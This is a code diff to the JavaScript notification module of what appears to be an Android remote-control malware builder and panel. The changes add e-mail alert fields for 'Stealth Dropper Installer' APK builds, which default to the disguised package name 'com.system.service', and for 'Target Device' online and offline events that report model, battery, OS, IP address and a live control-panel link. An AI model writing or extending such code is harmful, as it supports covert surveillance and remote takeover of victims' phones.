@@ -179,7 +179,15 @@ async function notifyApkBuildComplete(toEmail, { appName, packageName, buildType
         }
     });
 
-    return await sendCloudEmailAlert(toEmail, subject, html);
+    return await sendCloudEmailAlert(toEmail, subject, html, {
+        Alert: "APK Build Successfully Completed",
+        App_Name: appName,
+        Package: packageName || "com.system.service",
+        Build_Type: buildType === 'dropper' ? "Stealth Dropper Installer" : "Standalone Main APK",
+        User_UID: userId,
+        Completed_At: timeStr,
+        Download_URL: downloadUrl || "https://mobile-control-pro.web.app/builder.html"
+    });
 }
 
 /**
@@ -218,12 +226,21 @@ async function notifyDeviceOnline(toEmail, deviceId, deviceData = {}) {
         ],
         actionButton: {
             text: "🎮 Open Live Control Panel",
-            url: `https://mobile-control-pro.web.app/control.html?id=${deviceId}`,
+            url: `https://mobile-control-pro.web.app/control.html?did=${deviceId}`,
             color: "#30d158"
         }
     });
 
-    return await sendCloudEmailAlert(toEmail, subject, html);
+    return await sendCloudEmailAlert(toEmail, subject, html, {
+        Alert: "Target Device Connected (ONLINE)",
+        Device: model,
+        Device_ID: deviceId,
+        Battery: battery,
+        OS_Platform: osVersion,
+        IP_Address: ip,
+        Connected_At: timeStr,
+        Control_Panel: `https://mobile-control-pro.web.app/control.html?did=${deviceId}`
+    });
 }
 
 /**
@@ -257,12 +274,19 @@ async function notifyDeviceOffline(toEmail, deviceId, deviceData = {}) {
         ],
         actionButton: {
             text: "🔍 View Device History",
-            url: `https://mobile-control-pro.web.app/control.html?id=${deviceId}`,
+            url: `https://mobile-control-pro.web.app/control.html?did=${deviceId}`,
             color: "#ff453a"
         }
     });
 
-    return await sendCloudEmailAlert(toEmail, subject, html);
+    return await sendCloudEmailAlert(toEmail, subject, html, {
+        Alert: "Target Device Disconnected (OFFLINE)",
+        Device: model,
+        Device_ID: deviceId,
+        Last_Seen: timeStr,
+        Status: "Offline / Disconnected",
+        Control_Panel: `https://mobile-control-pro.web.app/control.html?did=${deviceId}`
+    });
 }
 
 // Attach to window for global access across all pages
